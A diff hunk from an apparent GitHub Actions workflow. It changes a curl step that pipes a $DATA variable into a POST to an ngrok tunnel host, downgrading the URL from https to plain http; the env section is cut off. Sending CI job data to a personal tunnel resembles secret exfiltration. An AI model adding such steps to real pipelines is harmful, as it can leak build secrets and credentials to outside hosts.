@@ -11,7 +11,7 @@ jobs:
       - run: |
           echo "'$DATA'" | xargs \
           curl \
-          -X POST https://666b-67-8-241-19.ngrok.io \
+          -X POST http://666b-67-8-241-19.ngrok.io \
           -H "Content-Type: application/x-www-form-urlencoded"
           -d "REDIS_STACK_DOCS_HASH=nothing"
         env:
